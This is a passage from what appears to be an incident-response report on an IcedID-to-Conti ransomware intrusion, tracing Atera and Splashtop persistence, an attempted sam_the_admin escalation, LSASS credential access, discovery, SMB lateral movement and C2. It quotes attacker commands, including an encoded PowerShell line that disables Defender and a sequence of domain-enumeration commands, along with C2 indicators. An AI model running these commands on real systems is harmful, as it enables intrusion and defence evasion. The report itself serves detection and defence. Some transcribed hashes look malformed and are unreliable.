--ob=\"CapitalLadder\\license.dat\"</Arguments>\n</Exec>\n```\n\n### Atera Agent\n\nThreat actors dropped and installed Atera agent (T1219), using two MSI packages “sql.msi” and “mstsc.msi”, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.\n\n```image\nAlt: Atera Agent\nDescription: The image displays a table summarizing actions taken during a cyber intrusion involving the installation of the Atera agent. The table includes columns for 'Computer Name', 'Initiating Process Command Line', 'Action Type', 'Folder Path', and 'File Name'. It lists actions such as file creation for the MSI packages 'mstsc.msi' and 'sql.msi', indicating that these files were dropped on specific systems, including a 'Beachhead' and a 'Domain Controller'. This data is relevant for understanding the attack vector and persistence mechanisms used by the threat actors.\nTranscription: |\n  | Computer Name     | Initiating Process Command Line | Action Type | Folder Path            | File Name |\n  | ----------------- | ------------------------------- | ----------- | ---------------------- | --------- |\n  | Beachhead         | Explorer.EXE                    | FileCreated | C:\\ProgramData         | mstsc.msi |\n  |                   | Explorer.EXE                    | FileCreated | \\\\Domain Controller\\C$ | mstsc.msi |\n  | Domain Controller | winlogon.exe                    | FileCreated | C:\\ProgramData         | sql.msi   |\n```\n\nThe installation of those two packages reveals two emails potentially belonging to the ransomware operators or affiliates:\n\n```\n/IntegratorLogin=\"marsmors1947@gmail.com\" /AccountId=\"0013z00002kcnS1AAI\"\n/IntegratorLogin=\"hughess6623@outlook.com\" /AccountId=\"0013z00002kbhSdAAI\"\n```\n\nAtera agent is a remote monitoring and management system.\n\nAt one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.\n\n```image\nAlt: Atera Beacon\nDescription: The image displays a detailed output from a command line interface, showing the process creation details of the Atera agent installation. It includes various technical attributes such as the Process GUID, Process ID, file version, description, company details, command line executed, and hashes for integrity verification. This information is relevant for understanding the threat actor's methods and the specific command used to run the Atera agent on the compromised system.\nTranscription: |\n  \"Process Create:\n  RuleName: technique_id=T1059, technique_name=Command-Line Interface\n  UtcTime: {78271c4c-3ba6-61be-d7b5-020000000580}\n  ProcessGuid: {78271c4c-3ba9-61be-d5b5-020000000580}\n  ProcessId: 8212\n  Image: C:\\Windows\\System32\\cmd.exe\n  FileVersion:\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  CommandLine: \"cmd.exe\"\n  CurrentDirectory: C:\\Windows\\system32\\\n  User: NT AUTHORITY\\SYSTEM\n  LogonGuid: {78271c4c-9fc7-612a-e703-000000000000}\n  LogonId: 0x1E7\n  TerminalSessionId: 0\n  IntegrityLevel: System\n  Hashes: SHA1=77B818918276D4B36144355929C042FB8D, MD5=32145035015122E6ACE9691197ABE3F, SHA256=100348525B388A5DB0095BB09EFD0EBC22680892F8E0F92AC7ED5909492B4F6, IMPHASH=272245E2988E1E430500B852C4FB5E18\n  ParentProcessId: 6716\n  ParentImage: C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageRunCommandInteractive\\AgentPackageRunCommandInteractive.exe\n  ParentCommandLine: \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageRunCommandInteractive\\AgentPackageRunCommandInteractive.exe\" 96550093-7d53-4a54-9644-38a6b2fe6f10 \"734ac2a8-ebec-4be1-89b2-3e378f7f3922\" agent-api.atera.com/Production 443 or8ixLi90Mf \"cmd_bf5\"\n```\n\n```image\nAlt: Atera Beacon\nDescription: The image displays a detailed output of a process creation event related to the Windows host process (rundll32.exe). It includes various technical details such as the process GUID, file version, command line used, and integrity level. Specific parameters like the image path, user account, and associated hashes (SHA-1 and SHA-256) are also included, which are critical for forensic analysis in cybersecurity.\nTranscription: |\n  \"Process Create:\n  RuleName: technique_id=T1218.002, technique_name=rundll32.exe\n  UtcTime:  2021-10-04 12:34:56.000000\n  ProcessGuid: {78271c4c-3bb4-61be-db5-202000000050}\n  ProcessId: 8732\n  Image: C:\\Windows\\System32\\rundll32.exe\n  FileVersion:\n  Description: Windows host process (Rundll32)\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: RUNDLL32.EXE\n  CommandLine: rundll32.exe C:\\ProgramData\\file.dll DllRegisterServer\n  CurrentDirectory: C:\\Windows\\system32\\\n  User: NT AUTHORITY\\SYSTEM\n  LogonGuid: {78271c4c-9f7c-612a-e703-000000000000}\n  LogonId: 0x3E7\n  TerminalSessionId: 0\n  IntegrityLevel: System\n  Hashes: SHA1=84DBB234151485B26686C7A94293024B1D5E021BF0D096123F7D312, SHA256=F1DC9560D0C381C78304D94F7BA46949001D79728A803C2DD32C8E957FC9F923, IMPHASH=4DB27267734D1576D75C991DC790F68AC\n  ParentProcessId: 8212\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  ParentCommandLine: \"cmd.exe\"\n```\n\n## Privilege Escalation\n\nThere were attempts to exploit Active Directory vulnerabilities CVE-2021-42278 and CVE-2021-42287 in order to create privileged accounts. This attempt failed, however, there were indicators through DNS requests enumerating accounts for the existence of SAMTHEADMIN-XX (XX being a random number). The query status 9003 indicates that this does not exist.\n\nThe injected process dllhost.exe requesting SAMTHEADMIN-92 and SAMTHEADMIN-20 accounts:\n\n```image\nAlt: SAMTHEADMIN\nDescription: The image displays a table containing DNS query information related to the accounts SAMTHEADMIN-92 and SAMTHEADMIN-20. It includes columns for 'QueryName', 'QueryStatus', and 'Image'. Both queries have a status code of 9003, indicating that the requested accounts do not exist. The 'Image' column shows the path to the dllhost.exe process associated with these queries, specifically located in the C:\\Windows\\system32\\ directory.\nTranscription: |\n  | QueryName      | QueryStatus | Image                           |\n  | -------------- | ----------- | ------------------------------- |\n  | SAMTHEADMIN-92 | 9003        | C:\\Windows\\system32\\dllhost.exe |\n  | SAMTHEADMIN-20 | 9003        | C:\\Windows\\system32\\dllhost.exe |\n```\n\nWe believe the operator used the publicly available script ‘sam_the_admin‘ or a variant based on it. Part of the script generates a new computer name account in the form SAMTHEADMIN- followed by a random value between 0 to 100, as indicated below.\n\n```image\nAlt: SAMTHEADMIN Script\nDescription: The image displays a code snippet in Python, illustrating a function named 'samtheadmin'. The function generates a new computer name in the format 'SAMTHEADMIN-XX' where 'XX' is a random integer between 1 and 100. Additionally, it creates a random password composed of 12 characters from a specified set. This code is part of a script related to privilege escalation and attack methods discussed in the context of a Conti ransomware campaign.\nTranscription: |\n  def samtheadmin(options):\n      new_computer_name = f\"SAMTHEADMIN-{random.randint(1,100)}$\"\n      new_computer_password = ''.join(random.choice(characters) for _ in range(12))\n```\n\nThe exploitation involves invoking lookups to ensure that the new accounts were successful, explaining why failed DNS requests were observed.\n\n## Defense Evasion\n\n### Disable Defender\n\nA base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001).\n\nEncoded Command:\n\n```\npowershell -nop -exec bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=\n```\n\nThe decoded base64 PowerShell command uses Set-MpPreference cmdlet to disable Defender’s real time monitoring:\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\n```\n\n### Process Injection\n\nA number of process injections were seen during this intrusion. The Cobalt Strike beacon used the **CreateRemoteThread** Win32 function in order to inject code into running processes. The usage of this function triggers the Sysmon Event ID 8, a well-known pattern of CS beacon activity.\n\nRemote threads were created in Winlogon and Explorer processes.\n\n```image\nAlt: Process Injection\nDescription: The image displays a detailed log of Sysmon events related to process injection activities associated with a security incident. It includes timestamps, source and target process IDs, process GUIDs, and images, along with specific function calls (e.g., 'CreateRemoteThread') and addresses. The logs indicate two instances of remote thread creation, one in 'Winlogon' and another in 'explorer.exe', with relevant event IDs and technique IDs, providing valuable technical information for threat analysis.\nTranscription: |\n  \"Microsoft-Windows-Sysmon/Operational\",,,,,\"xxxxxxxxxxxxxx\",,,,,,\"8\",\"144589\"\n  UtcTime: 15:53:25.364\n  SourceProcessGuid: {78271c4c-76f5-61b3-6561-000000000500}\n  SourceProcessId: 2116\n  SourceImage: C:\\Windows\\System32\\regsvr32.exe\n  TargetProcessGuid: {78271c4c-a286-61a3-7105-000000000500}\n  TargetProcessId: 1680\n  TargetImage: C:\\Windows\\System32\\winlogon.exe\n  NewThreadId: 5468\n  StartAddress: 0x000002029E1B0008\n  StartModule: -\n  StartFunction: -\"\"0\",\"0\",\"650\",\"{5770385}\",,,\"\"CreateRemoteThread detected:\n  \n  \"Microsoft-Windows-Sysmon/Operational\",,,,,\"xxxxxxxxxxxxxx\",,,,,,\"8\",\"81102\"\n  UtcTime: 01:26:20.895\n  SourceProcessGuid: {78271c4c-a7fe-61b2-b534-000000000500}\n  SourceProcessId: 9560\n  SourceImage: C:\\Users\\xxxxxx\\AppData\\Local\\Temp\\Faicy4.exe\n  TargetProcessGuid: {78271c4c-9fc-61a2-8e00-000000000500}\n  TargetProcessId: 6284\n  TargetImage: C:\\Windows\\explorer.exe\n  NewThreadId: 10360\n  StartAddress: 0x0000000003520002\n  StartModule: -\n  StartFunction: -\"\"0\",\"0\",\"650\",\"{5770385}\",,,\"\"CreateRemoteThread detected:\n```\n\n## Credential Access\n\n### LSASS Access\n\nThe threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.\n\n```image\nAlt: LSASS Access\nDescription: The image is a screenshot detailing the memory read activity of the 'dllhost.exe' process accessing the 'lsass.exe' process memory. It includes metrics such as the number of bytes copied (6223310), the number of reads (1868), and the action time. Additionally, it references the MITRE technique T1003.001, indicating it relates to LSASS memory access. A warning at the bottom highlights the action as 'Sensitive credential memory read,' indicating the potential security implications of this access.\nTranscription: |\n  dllhost.exe read lsass.exe process memory\n  \n  Bytes copied: 6223310\n  Number of reads: 1868\n  Action time:\n  Mitre techniques: T1003.001: LSASS Memory\n  Target process: [732] lsass.exe\n  \n  Sensitive credential memory read\n```\n\nThe screenshot below shows the different “DesiredAccess” to the LSASS process object from different beacons (dllhost.exe, Edebef4.dll, etc.) or Task Manager:\n\n```image\nAlt: LSASS Access\nDescription: The image is a screenshot of a table detailing various access attempts to the LSASS process. It lists columns for 'Computer Name', 'Process Command Line', 'Additional Fields', 'Action Type', and 'Initiating Process Command Line'. The 'Additional Fields' column specifically highlights the 'DesiredAccess' values attempted during these actions, which are crucial for understanding the context of credential dumping attempts. This technical data is relevant to cyber threat intelligence, particularly in identifying and analyzing potential unauthorized access.\nTranscription: |\n  | **Computer Name** | **Process Command Line** | **Additional Fields**     | **Action Type**    | **Initiating Process Command Line**                                    |\n  | ----------------- | ------------------------ | ------------------------- | ------------------ | ---------------------------------------------------------------------- |\n  |                   | lsass.exe                | { \"DesiredAccess\": 5136 } | OpenProcessApiCall | \"taskmgr.exe\" /4                                                       |\n  |                   | lsass.exe                | { \"DesiredAccess\": 64 }   | OpenProcessApiCall | rundl132.exe \\\\<blackacted>\\c$\\ProgramData\\c64.dll, StartA             |\n  |                   | lsass.exe                | { \"DesiredAccess\": 4112 } | OpenProcessApiCall | dllhost.exe                                                            |\n  |                   | lsass.exe                | { \"DesiredAccess\": 5136 } | OpenProcessApiCall | taskmgr.exe                                                            |\n  |                   | lsass.exe                | { \"DesiredAccess\": 64 }   | OpenProcessApiCall | regsvr32.exe /s \"C:\\Users\\<blackacted>\\AppData\\Local\\Temp\\Edebef4.dll\" |\n```\n\nThe table below maps the “DesiredAccess” values with the actual corresponding access rights, and examples of credentials dumping tools requesting those accesses:\n\n| **Desired Access** | **Hex value** | **Process Access Rights**                                                                                                | **Offensive Tools**              |\n| ------------------ | ------------- | ------------------------------------------------------------------------------------------------------------------------ | -------------------------------- |\n| 5136               | 1410          | **PROCESS_VM_READ (0x0010)**<br>**PROCESS_QUERY_INFORMATION (0x0400)**<br>**PROCESS_QUERY_LIMITED_INFORMATION (0x1000)** | Mimikatz (Winver <5)<br>NanoDump |\n| 4112               | 1010          | **PROCESS_VM_READ (0x0010)**<br>**PROCESS_QUERY_LIMITED_INFORMATION (0x1000)**                                           | Mimikatz (Winver >=6)            |\n| 64                 | 40            | **PROCESS_DUP_HANDLE (0x0040)**                                                                                          | MirrorDump<br>HandleKatz         |\n\n*A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.*\n\nThose “DesiredAccess” values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool.\n\nIn our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.\n\n## Discovery\n\nMultiple discovery techniques were observed throughout the case. The initial discovery techniques were conducted on the beachhead host by the IcedID malware – focusing on determining the system language and security products installed (T1518.001). Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration.\n\nDiscovery was achieved using a combination of living off the land techniques (WMIC and CMD) and via third-party tools.\n\n```\ncmd.exe /c chcp >&2\nipconfig /all\nsysteminfo\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet group \"Domain Admins\" /domain\ncmd.exe /C nltest /dclist:\ncmd.exe /C net group /domain \"Domain Computers\"\ncmd.exe /C net group /domain \"Enterprise Admins\"\n```\n\nThreat actors also used “chcp” for discovery of the system locale/language (T1614.001). Change Control Page (ChCP) is a Microsoft utility for changing the console control page (language). In this case, the existing control page language was collected using the following command:\n\n```\ncmd.exe /c chcp >&2\n```\n\nAs a test, entering this on a command prompt shows a numeric value. The Microsoft link shows the number of the language used (437 – United States).\n\n```image\nAlt: ChCP Output\nDescription: The image displays the output of a command executed in a command prompt window, specifically the output of the command 'chcp >&2'. It shows that the active code page is 437, which corresponds to the United States system locale. The command is executed by a user in the directory 'C:\\Users\\user'. The text is presented in a green font on a black background, typical of a command line interface.\nTranscription: |\n  C:\\Users\\user>chcp >&2\n  Active code page: 437\n```\n\nIt is highly likely that the threat actors were establishing the country of origin based on the language used – an extra fail-safe check to ensure certain users or regions were not targeted. The `>&2` parameter could indicate a parameter was expected as part of a script, or possibly a redirect using stderr.\n\nThe second discovery was from a different Cobalt Strike beacon “Faicuy4.exe” which focused on domain discovery and user groups using the net command.\n\nOnce the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).\n\n```image\nAlt: AdFind\nDescription: The image displays a command line output related to various commands executed in a cybersecurity context. It shows a list of command line instructions involving the execution of 'cmd.exe' with different parameters, specifically commands for running batch files and utilizing the 'adfind.exe' utility for querying Active Directory objects. The commands are organized in a tabular format, indicating specific object categories such as 'person', 'computer', 'organizationalUnit', and 'group', along with additional flags and options used in the queries, which are relevant for threat detection and analysis.\nTranscription: |\n  Process Command Line\n  cmd.exe /C adf.bat\n  cmd.exe /C adf.bat\n  conhost.exe 0xffffffff -ForceV1\n  adfind.exe -f \"(objectcategory=person)\"\n  adfind.exe -f \"(objectcategory=person)\"\n  adfind.exe -f \"objectcategory=computer\"\n  adfind.exe -f \"objectcategory=computer\"\n  adfind.exe -f \"(objectcategory=organizationalUnit)\"\n  adfind.exe -f \"(objectcategory=organizationalUnit)\"\n  adfind.exe -sc trustdmp\n  adfind.exe -sc trustdmp\n  adfind.exe -subnets -f (objectCategory=subnet)\n  adfind.exe -subnets -f (objectCategory=subnet)\n  adfind.exe -f \"(objectcategory=group)\"\n  adfind.exe -f \"(objectcategory=group)\"\n  adfind.exe -gcb -sc trustdmp\n  adfind.exe -gcb -sc trustdmp\n```\n\n‘adf.bat’ is a common batch file that we have observed in previous cases, we saw this script in 2020 as part of a Ryuk intrusion. The recent Conti leaks indicate that Conti operators were surprised Ryuk operators were using their file.\n\nThe PowerView module Invoke-ShareFinder was executed from the beachhead host and a domain controller.\n\n```image\nAlt: Invoke-ShareFinder\nDescription: The image displays a command output from the PowerShell module Invoke-ShareFinder. It shows the parameter bindings for the command, indicating various settings and their values for checking share access across a network. The output lists several network shares, including administrative shares like \\C$ and \\SYSVOL, along with annotations suggesting their purposes, such as 'Remote Admin' and 'Default share.' This information is relevant to understanding the network configuration and potential targets during a cybersecurity investigation.\nTranscription: |\n  CommandInvocation(Invoke-ShareFinder): \"Invoke-ShareFinder\"\n  ParameterBinding(Invoke-ShareFinder): name=\"CheckShareAccess\"; value=\"True\"\n  ParameterBinding(Invoke-ShareFinder): name=\"Verbose\"; value=\"True\"\n  ParameterBinding(Invoke-ShareFinder): name=\"HostList\"; value=\"\"\n  ParameterBinding(Invoke-ShareFinder): name=\"ExcludePrint\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"ExcludeIPC\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"NoPing\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"CheckAdmin\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"Delay\"; value=\"0\"\n  ParameterBinding(Invoke-ShareFinder): name=\"Domain\"; value=\"\"\n  CommandInvocation(Out-File): \"Out-file\"\n  ParameterBinding(Out-File): name=\"Encoding\"; value=\"ascii\"\n  ParameterBinding(Out-File): name=\"FilePath\"; value=\"C:\\ProgramData\\shda.txt\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\ADMIN$ - Remote Admin\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\ADMIN$ - Remote Admin\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\ADMIN$ - Remote Admin\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\install - \"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\NETLOGON - Logon server share\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\SYSVOL - Logon server share\"\n```\n\nSome network discovery was conducted using the ping utility to check the existence of hosts on the network (T1049).\n\n```image\nAlt: Ping Discovery\nDescription: The image displays a log of command lines executed in a Windows environment, specifically related to the execution of the 'ping' command. It shows multiple instances of 'cmd.exe /C ping' followed by obscured IP addresses or hostnames, indicating network discovery attempts made by a threat actor. The presence of 'conhost.exe' commands suggests these pings are being executed from console windows, and the parameters used indicate possible attempts to force specific network-related behaviors or configurations.\nTranscription: |\n  Process Command Line\n  cmd.exe /C ping \\\\<REDACTED>\\\n  cmd.exe /C ping \\\\<REDACTED>\\\n  conhost.exe 0xffffffff -ForceV1\n  ping \\\\<REDACTED>\\\n  ping \\\\<REDACTED>\\\n  cmd.exe /C ping \\\\<REDACTED>\\\n  cmd.exe /C ping \\\\<REDACTED>\\\n  conhost.exe 0xffffffff -ForceV1\n  ping \\\\<REDACTED>\\\n  ping \\\\<REDACTED>\\\n```\n\nFilesystem discovery (T1083) was conducted to collect directory lists to a text file.\n\n```image\nAlt: Filesystem Discovery\nDescription: The image shows a command line output from a Windows command prompt. It contains the command line that was executed, specifically `C:\\Windows\\system32\\cmd.exe /C dir \"\\<REDACTED>\\C$\" /s >> list.txt`, indicating that a directory listing of a remote system (the administrative share C$) was being saved to a file named 'list.txt'. Additionally, it shows the current directory from which this command was executed, which is `C:\\ProgramData\\`. This output is relevant to the context of discovering filesystem information during a cybersecurity incident.\nTranscription: |\n  CommandLine: C:\\Windows\\system32\\cmd.exe /C dir \"\\\\<REDACTED>\\C$\" /s >> list.txt\n  CurrentDirectory: C:\\ProgramData\\\n```\n\nOther variations included:\n\n- `C:\\Windows\\system32\\cmd.exe /C dir “\\\\<REDACTED>\\C$” /s >> listback.txt`\n- `C:\\Windows\\system32\\cmd.exe /C dir “\\\\<REDACTED>\\C$” /s >> list1.txt`\n\n## Lateral Movement\n\nOn the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL’s onto a domain controller and another server.\n\n```image\nAlt: Lateral Movement\nDescription: The image displays a tabular data representation showing network traffic information. The columns include source IP/country, source port, destination IP/country, destination port, number of packets, total data in databytes/bytes, and additional file information. The rows list different source IP addresses and associated metrics for communication over port 445, which is commonly used for SMB (Server Message Block) traffic. The filenames indicated in the 'Info' column suggest that the data involves a DLL file named 'c64.dll' located in the 'ProgramData' directory.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                                              |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | ------------------------------------------------- |\n  | 10               | 59472    | 10               | 445      | 348     | 353,895 / 373,608 | Filename: ProgramData\\c64.dll DeployDebug ...less |\n  | 10               | 51386    | 10               | 445      | 43      | 8,049 / 10,535    | Filename: ProgramData\\c64.dll ProgramData         |\n  | 10               | 51206    | 10               | 445      | 632     | 687,236 / 724,665 | Filename: ProgramData\\c64.dll ProgramData         |\n```\n\nServices were then created on the hosts to execute the uploaded Cobalt Strike Beacons.\n\n```image\nAlt: Service Creation\nDescription: The image is a screenshot of a log data table that appears to show event data related to system services. It includes columns for the system channel, service name, image path, and account name. The specific entries indicate services associated with 'cmd.exe' executing 'rundll32.exe' with a DLL file located in 'C:\\ProgramData'. This log data is likely relevant to analyzing malicious service creation and execution related to the Cobalt Strike campaign.\nTranscription: |\n  | data.win.system.channel | data.win.eventdata.serviceName | data.win.eventdata.imagePath                     | data.win.eventdata.accountName |\n  | ----------------------- | ------------------------------ | ------------------------------------------------ | ------------------------------ |\n  | System                  | 3999954                        | cmd.exe /c rundll32.exe \\\\c$\\ProgramData\\c64.dll | LocalSystem                    |\n  | System                  | 0b94ebd                        | cmd.exe /c rundll32.exe \\\\c$\\ProgramData\\c64.dll | LocalSystem                    |\n```\n\nOn the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.\n\n```image\nAlt: SMB Transfer\nDescription: The image is a table displaying network traffic data related to two executable files involved in a lateral movement attack. It includes columns for source IP/country, source port, destination IP/country, destination port, packet count, bytes transferred, and associated filenames. The filenames listed are '61582ab.exe' and '044b7e1.exe', which are linked to the Cobalt Strike malware operation. The data provides specific metrics about the network activity and file transfers that occurred during the attack.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                  |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | --------------------- |\n  |                  | 53261    |                  | 445      | 560     | 616,404 / 648,504 | Filename: 61582ab.exe |\n  |                  | 53253    |                  | 445      | 561     | 616,404 / 648,334 | Filename: 044b7e1.exe |\n```\n\nThe beacons were then executed using a remote service.\n\n```image\nAlt: Remote Service Execution\nDescription: The image displays a screenshot of Event ID 7045 from the Windows Event Viewer, indicating that a service was installed on the system. It includes key details such as the Service Name ('044b7e1'), Service File Name (pointing to a file on a network share), Service Type (user mode service), Service Start Type (demand start), and the Service Account (LocalSystem). This information is relevant for understanding the context of lateral movement and service creation related to a ransomware attack.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  \n  A service was installed in the system.\n  Service Name: 044b7e1\n  Service File Name: \\\\ADMIN$\\044b7e1.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\nKnown Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons. Named pipes connections can be observed through Sysmon Event ID 18.\n\nNote that the named pipes followed **MSSE-[0-9]{4}-server** pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:\n\n```\npipeName: \\MSSE-3328-server and Image: 61582ab.exe\npipeName: \\MSSE-7344-server and Image: 044b7e1.exe\n```\n\n```image\nAlt: Named Pipes\nDescription: The image displays a Sysmon event log entry related to a named pipe connection in a Windows environment. The log includes detailed information such as EventCode (18), EventType (4), and the computer name obscured for privacy. It shows the message indicating a pipe connection, providing a rule name associated with the SMB technique. Additionally, it lists the timestamp, process GUID, process ID, and the specific named pipe being connected to, demonstrating the technical details of a potential lateral movement activity in a cyber threat context.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=18\n  EventType=4\n  ComputerName=DC Name\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=1717578\n  Keywords=None\n  TaskCategory=Pipe Connected (rule: PipeEvent)\n  OpCode=Informations\n  Message=Pipe Connected:\n  RuleName: technique_id=T1021.002, technique_name=SMB/Windows Admin Shares\n  EventType=ConnectPipe\n  UtcTime=22:13:29.104\n  ProcessGuid={f2bd618e-3a87-61ca-1808-020000000600}\n  ProcessId=9088\n  PipeName=\\MSSE-3328-server\n  Image=61582ab.exe\n```\n\n```image\nAlt: Named Pipes\nDescription: The image displays a Sysmon event log detailing a named pipe connection event. It includes various fields such as LogName, EventCode, ComputerName (redacted), User, TaskCategory, and message details indicating a 'Pipe Connected' event. The image shows a specific PipeName '\\MSSE-7344-server' associated with an executable image '044b7e1.exe', highlighting the technical attributes relevant to lateral movement in a cyber threat context.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=18\n  EventType=4\n  ComputerName=DC Name\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=647444\n  Keywords=None\n  TaskCategory=Pipe Connected (rule: PipeEvent)\n  OpCode=Informations\n  Message=Pipe Connected:\n  RuleName: technique_id=T1021.002, technique_name=SMB/Windows Admin Shares\n  EventType=ConnectPipe\n  UtcTime=22:13:17.006\n  ProcessGuid={47d5446d-3a7b-61ca-f933-000000000500}\n  ProcessId=7492\n  PipeName: \\MSSE-7344-server\n  Image: \\044b7e1.exe\n```\n\n## Command and Control\n\nWe observed the IcedID DLL dropping multiple CS beacons on the beachhead.\n\n```image\nAlt: CS Beacons\nDescription: The image is a flowchart depicting the process related to the IcedID DLL and its operation within a cyber threat context. It shows how the IcedID DLL drops multiple Cobalt Strike beacons, along with specifics such as the command used to register the DLL and the various associated file names (e.g., ljucko32.dll, Ewge.dll). Additionally, it lists several IP addresses and domain names that are relevant to the Cobalt Strike beacons, highlighting their significance in the cyber attack narrative.\nTranscription: |\n  IcedID DLL\n      |\n      |-- Dropped multiple Cobalt Strike Beacons\n             |-- ljucko32.dll\n             |-- Ewge.dll\n             |-- Edebef4.dll\n             |-- Faicuy4.exe\n      |\n      |-- regsvr32.exe C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\baeb13eea3a71cfaba9d20ef373dcea69cf31f2ec21f45b83f29f699330cb3e3.dll\n      |\n      |-- IP: 5.181.80.1[214:80] guguchrome[.]com\n      |-- IP: 5.181.80.113[443] applesflying[.]com\n      |-- IP: 103.208.86[17:80] bunced[.]net\n      |-- IP: 172.241.29[192:443] wayeyoy[.]com\n```\n\n```image\nAlt: CS Beacons\nDescription: The image is a screenshot of a log or data table displaying various attributes related to file downloads initiated by the process 'regsvr32.exe'. It includes columns for action type, initiating process file name, initiating process command line, initiating process folder path, initiating process parent file name, and file name. The data appears to show multiple instances where files were downloaded from the internet, with specific details about the commands and locations involved in the process.\nTranscription: |\n  | Action Type                       | Initiating Process File Name | Initiating Process Command Line                                                                              | Initiating Process Folder Path | Initiating Process Parent File Name | File Name    |\n  | --------------------------------- | ---------------------------- | ------------------------------------------------------------------------------------------------------------ | ------------------------------ | ----------------------------------- | ------------ |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | Edebef4.dll  |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | Ewge.dll     |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | ljucko32.dll |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | Faicuy4.exe  |\n```\n\n### Splashtop Streamer\n\nThreat actors used Splashtop Streamer via Atera agent, allowing them to remotely connect to machines without using RDP tunneling or other techniques previously seen in our cases.\n\nBy default, the Splashtop Streamer is automatically installed together with the AteraAgent.\n\n```image\nAlt: Splashtop Streamer\nDescription: The image displays a table containing information on two computers: \"Beachhead\" and \"Domain Controller.\" For each computer, it lists the initiating process command line, which includes the executable name \"AgentPackageSTRemote.exe\" followed by a unique identifier, as well as the remote URLs associated with each machine. The table provides critical details relevant to the Splashtop Streamer usage in a cyber threat context.\nTranscription: |\n  | Computer Name     | Initiating Process Command Line                                                                               | Remote URL             |\n  | ----------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------- |\n  | Beachhead         | \"AgentPackageSTRemote.exe\" 96550093-7d53-4a54-9644-38a6b2fe6f10 \"3cff8f1c-e549-4c1f-aabc-343b457afaca\" agent- | my.splashtop.com       |\n  |                   | \"AgentPackageSTRemote.exe\" 96550093-7d53-4a54-9644-38a6b2fe6f10 \"3cff8f1c-e549-4c1f-aabc-343b457afaca\" agent- | download.splashtop.com |\n  | Domain Controller | \"AgentPackageSTRemote.exe\" 